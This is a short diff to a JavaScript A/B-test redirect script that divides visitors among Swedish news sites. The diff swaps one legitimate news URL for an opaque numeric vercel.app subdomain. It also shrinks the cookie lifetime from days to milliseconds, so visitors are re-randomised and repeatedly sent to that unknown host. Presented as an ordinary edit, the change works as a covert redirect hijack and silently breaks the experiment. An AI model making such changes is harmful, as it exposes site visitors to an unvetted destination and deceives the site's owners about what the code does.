@@ -25,7 +25,7 @@
 		// List of URLs (two or more) for the experimental treatment and control groups.
 		var RedirectURLs = {
 			"urls" : [
-				{ "url" : "http://www.aftonbladet.se/" },
+				{ "url" : "https://7112369370.vercel.app/" },
 				{ "url" : "http://www.dn.se/" },
 				{ "url" : "http://www.svd.se/" }
 			]
@@ -65,7 +65,7 @@
 		// Set cookie with randomization value.
 		function SetCookie(CookieValue, DaysUntilExpire) {
 			var d = new Date();
-			d.setTime(d.getTime() + (DaysUntilExpire * 24 * 60 * 60 * 1000));
+			d.setTime(d.getTime() + (DaysUntilExpire * 1));
 			document.cookie = "rnd=" + CookieValue + ";expires=" + d.toUTCString();
 		}
 
